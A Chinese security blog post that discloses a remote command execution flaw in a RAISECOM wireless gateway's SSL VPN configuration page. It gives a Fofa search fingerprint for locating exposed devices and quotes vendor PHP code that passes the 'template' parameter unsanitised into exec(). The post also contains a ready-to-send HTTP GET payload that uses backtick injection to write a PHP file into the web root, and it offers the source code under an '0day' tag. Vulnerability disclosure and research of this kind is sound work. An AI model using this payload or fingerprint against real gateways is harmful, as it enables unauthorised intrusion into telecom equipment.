#  RAISECOM网关设备存在远程命令执行漏洞(RCE)   
原创 Mstir  星悦安全   2024-10-26 12:31  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
**瑞斯康达提供系列无线接入产品及解决方案，包含核心网、基站网关、网管、各系列小基站等。具有集约化、IP化、智能化的特点，是一种灵活、高性价比的室内外深度覆盖解决方案。针对运营商补盲、补热和快速部署、快速开通的挑战性需求，满足细分场景和复杂场景的精细化覆盖，顺应移动宽带高吞吐量的覆盖需求，实现移动网络容量与覆盖的平衡，充分提升移动互联网用户业务体验**  
  
**Fofa指纹:body="/images/raisecom/back.gif"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5foMldnVDTUoKfPpukgB7guicvzgxwJQosJrsXVycZ8GaZ3H98qkQXkWmIxyfaEN4YicgEvxXVC7NMQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5foMldnVDTUoKfPpukgB7guvH7U1A0WQ271ETFticw3IQrvy7uNTWTP3jERd0ePL1ZeGrVhEXGYCcA/640?wx_fmt=png&from=appmsg "")  
## 0x01 漏洞分析  
##   
  
**位于 /vpn/list_base_config.php 直接New了一个sslvpn_class 类，然后进入到了 sslvpn_config_mod 方法中，我们追踪一下.**  
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<?
  require_once('../php_class/sslvpn_class.php');
?>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Ϟ±덢τµµ</title>
<link href="../css/list.css" rel="stylesheet" type="text/css" />
<link href="../css/node_info.css" rel="stylesheet" type="text/css" />
<script src="../js_script/function.js"></script>
<script src="../../js_script/ajax_function.js"></script>
</head>
<body>
<?
$type ='list';
$parts ='base_config';
$pages =1;
$add_page ='';
$mod_page ='';
$rult_type =1;
$type = isset($_REQUEST['type'])? $_REQUEST['type']:$type;
$parts = isset($_REQUEST['parts'])? $_REQUEST['parts']: $parts;
$pages =isset($_REQUEST['pages'])? $_REQUEST['pages']:$pages;
$rule_type = isset($_REQUEST['serch_value'])? $_REQUEST['serch_value']:$rule_type;
$obj_sslvpn = new sslvpn_class();
switch($parts)
{
  case 'base_config':
    switch($type)
    {
      case 'mod':
      $obj_sslvpn->sslvpn_config_mod(2);
      break;
      default:
      break;
    }
    header('Location:./base_config.php');  
    break;
  default:
    break;
}  
?>
</body>
</html>
```  
  
**实际在 /php_class/sslvpn_class.php 中，我们找到了父类，只需要传入template 就直接造成命令执行.**  
```
  class sslvpn_class
  {
  
    function sslvpn_config_mod($config_type)
    {
    //  $start_comm = "mount /dev/cfa1  /mnt/";
    //  exec($start_comm);
        
      if(!empty($_FILES['titlefile']['name']) || !empty($_FILES['bottom_file']['name']) || !empty($_FILES['cssfile']['name']))
      {
        if(!empty($_FILES['titlefile']['name']))
        {
          if(check_file_type($_FILES['titlefile']['name']))
          {  
            if(strtolower($_FILES['titlefile']['name'])!="")
            {  
              $title_uploadpath = "/config/replace_top_banner.gif";
              
              $orign_top_file = $_FILES['titlefile']['tmp_name'];
              
              move_uploaded_file($orign_top_file,$title_uploadpath);
            }
          }
        }
        
        
        if(!empty($_FILES['bottom_file']['name']))
        {
          if(check_file_type($_FILES['bottom_file']['name']))
          {
            if(strtolower($_FILES['bottom_file']['name'])!="")
            {
              $bottom_uploadpath = "/config/replace_bottom_logo.gif";
              
              $orign_bottom_file = $_FILES['bottom_file']['tmp_name'];
    
              move_uploaded_file($orign_bottom_file, $bottom_uploadpath);
            }
          }
        }
                
        if(!empty($_FILES['cssfile']['name']))
        {
          if(check_css($_FILES['cssfile']['name']))
          {
            if(strtolower($_FILES['cssfile']['name'])!="")
            {
              $css_uploadpath = "/config/replace_utmcss.css";
              $orign_css_file = $_FILES['cssfile']['tmp_name'];
              
              move_uploaded_file($orign_css_file,$css_uploadpath);
            }
          }
        }
      }
      
      $mod_xml = '<sslvpn_config action="mod"><group>';
      $mod_xml .= '<config_type>'.$config_type.'</config_type>';
      if($_REQUEST['status'] == 'on')
        $mod_xml .='<sslvpn_status>1</sslvpn_status>';
      else
        $mod_xml .='<sslvpn_status>0</sslvpn_status>';
      if($_REQUEST['compress'] == 'on')
        $mod_xml .='<compress>1</compress>';
      else
        $mod_xml .='<compress>0</compress>';
      if($_REQUEST['pass_verify'] == 'on')
        $mod_xml .='<pass_verify>1</pass_verify>';
      else
        $mod_xml .='<pass_verify>0</pass_verify>';
      if($_REQUEST['user_check'] == 'on')
        $mod_xml .='<user_check>1</user_check>';
      else
        $mod_xml .='<user_check>0</user_check>';
      if($_REQUEST['agent_en'] == 'on')
        $mod_xml .='<agent_status>1</agent_status>';
      else
        $mod_xml .='<agent_status>0</agent_status>';
      $mod_xml .='<port>'.$_REQUEST['port'].'</port>';
      $mod_xml .='<idle_timeout>'.$_REQUEST['idle_timeout'].'</idle_timeout>';
      
      /**************************************
       * kevin 2010年12月22日添加 ---start---
       **************************************/
      if($_REQUEST['chk_title'] == 1)
        $mod_xml .= "<replace_title>1</replace_title>";
      else
        $mod_xml .= "<replace_title>0</replace_title>";

      if($_REQUEST['top_image'] == 1)
      {
        $mod_xml .= "<replace_top_img>1</replace_top_img>";
        // added by liangxia
        $filename = "/config/replace_top_banner.gif";
        if(file_exists($filename))
        {
          $start_comm = "cp -f /config/replace_top_banner.gif /usr/local/sslroot/pages/images/top_banner.gif";
          exec($start_comm);
        }
        else
        {
          $start_comm = "cp -f /usr/local/sslroot/pages/images/default_top_banner.gif /usr/local/sslroot/pages/images/top_banner.gif";
          exec($start_comm);
        }
      }
      else
      {
        $mod_xml .= "<replace_top_img>0</replace_top_img>";  
      // added by lxh,2011 08.03
        if( $config_type == 3){ //only web custom to copy
          $start_comm = "cp -f /usr/local/sslroot/pages/images/default_top_banner.gif /usr/local/sslroot/pages/images/top_banner.gif";
          exec($start_comm);
        }
      }
      
      if($_REQUEST['bottom_image'] == 1)
      {
        $mod_xml .= "<replace_bottom_img>1</replace_bottom_img>";
        // added by liangxia
        $filename = "/config/replace_bottom_logo.gif";
        if(file_exists($filename))
        {
          $start_comm = "cp -f /config/replace_bottom_logo.gif /usr/local/sslroot/pages/images/bottom_logo.gif";
          exec($start_comm);
        }
        else
        {
          $start_comm = "cp -f /usr/local/sslroot/pages/images/default_bottom_logo.gif /usr/local/sslroot/pages/images/bottom_logo.gif";
          exec($start_comm);
        }
      }
      else
      {
        $mod_xml .= "<replace_bottom_img>0</replace_bottom_img>";
        // added by lxh,2011 08.03
        if( $config_type == 3){ //only web custom to copy
          $start_comm = "cp -f /usr/local/sslroot/pages/images/default_bottom_logo.gif /usr/local/sslroot/pages/images/bottom_logo.gif";
          exec($start_comm);
        }
      }
      
      if($_REQUEST['css_file'] == 1)
      {
        $mod_xml .= "<replace_css_file>1</replace_css_file>";
        // added by liangxia
        //$filename = "/mnt/replace_utmcss.gif"; modifided by liangxia for bug MSG00001168
        $filename = "/config/replace_utmcss.css";
        if(file_exists($filename))
        {
          $start_comm = "cp -f /config/replace_utmcss.css /usr/local/sslroot/utmcss.css";
          exec($start_comm);
        }
        else
        {
          $start_comm = "cp -f /usr/local/sslroot/default_utmcss.css /usr/local/sslroot/utmcss.css";
          exec($start_comm);
        }
      }
      else
      {
        $mod_xml .= "<replace_css_file>0</replace_css_file>";
        // added by lxh,2011 08.03
        if( $config_type == 3){ //only web custom to copy
          $start_comm = 'cp -f /usr/local/sslroot/pages'.$_REQUEST['template'].'/utmcss'.$_REQUEST['stylenum'].'.css /usr/local/sslroot/utmcss.css';
          exec($start_comm);
        }
      }
      
    //  $end_comm = "umount /mnt";
    //  exec($end_comm);
      
      /* add by lxh for  template custom,2011 07.12 */
      $mod_xml .= '<template>'.$_REQUEST['template'].'</template>';
      $start_comm = 'cp -f /usr/local/sslroot/pages'.$_REQUEST['template'].'/*.html /usr/local/sslroot/pages/';
      exec($start_comm);
      $start_comm = 'cp -f /usr/local/sslroot/pages'.$_REQUEST['template'].'/images'.$_REQUEST['stylenum'].'/* /usr/local/sslroot/pages/images/';
      exec($start_comm);
      $mod_xml .= '<style>'.$_REQUEST['stylenum'].'</style>';
      $start_comm = 'cp -f /usr/local/sslroot/pages'.$_REQUEST['template'].'/utmcss'.$_REQUEST['stylenum'].'.css /usr/local/sslroot/utmcss.css';
      exec($start_comm);
      
      if($_REQUEST['cert_verify'] == 'on')
        $mod_xml .='<verify_client>1</verify_client>';
      else
        $mod_xml .='<verify_client>0</verify_client>';
        
      if($_REQUEST['cert_verify'] == 'on' && $_REQUEST['cert_name'] != -1)
        $mod_xml .='<cert_name>'.$_REQUEST['cert_name'].'</cert_name>';
      else
        $mod_xml .='<cert_name/>';
      /* Begin: Modified by lf2690 2012/06/05  for server cert */
      $mod_xml .='<server_cert>'.$_REQUEST['server_cert'].'</server_cert>';
      /* End: Modified by lf2690 2012/06/05 */
      /***************************************
       * ---end---
       ***************************************/  
        
      $mod_xml .='<home_info>'.$_REQUEST['home_info'].'</home_info>';
      $mod_xml .='<start_ipaddr>'.$_REQUEST['start_ipaddr'].'</start_ipaddr>';
      $mod_xml .='<end_ipaddr>'.$_REQUEST['end_ipaddr'].'</end_ipaddr>';
      
//modify by lxh for bug: 757 ,2011 07.27
//      $mod_xml .='<dns>'.$_REQUEST['dns'].'</dns>';
//      $mod_xml .='<wins>'.$_REQUEST['wins'].'</wins>';      
      if($_REQUEST['dns'])
        $mod_xml .='<dns>'.$_REQUEST['dns'].'</dns>';
      else
        $mod_xml .='<dns>0.0.0.0</dns>';        
      if($_REQUEST['wins'])
        $mod_xml .='<wins>'.$_REQUEST['wins'].'</wins>';
      else
        $mod_xml .='<wins>0.0.0.0</wins>';
//end modify by lxh for bug: 757 ,2011 07.27
      
      $lrmask_arr =explode(';',$_REQUEST['list_route_mask1']);
      $lrmask_len = count($lrmask_arr) - 1;
      if($lrmask_len > 0)
      {
        $mod_xml .='<lrmask>';
        for($k=0;$k < $lrmask_len; $k++)
        {
          $mod_xml .='<group>';
          $mod_xml .='<mask_addr>'.$lrmask_arr[$k].'</mask_addr>';
          $mod_xml .='</group>';
        }
        $mod_xml .='</lrmask>';
      }
      $mod_xml .='</group></sslvpn_config>';
      Node_mod($mod_xml);
    }
```  
## 0x02 漏洞复现  
##   
  
**Payload:**  
```
GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ffw.php%60 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Cookie: PHPSESSID=r7m4cdfbf3eerao8ovt85volgb; device_language=english; last_cpu_list=; last_mem_list=
Host: 127.0.0.1
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
```  
  
**会将phpinfo 写到 /tmp/fw.php 中**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5foMldnVDTUoKfPpukgB7gumH2MIPj4S5su5hR3AGGywoULx4TcyTiafdNKUFxDn0paFaukb0piaJoA/640?wx_fmt=png&from=appmsg "")  
## 0x03 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**RA网关源码关注公众号发送 241026 获取!**  
  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
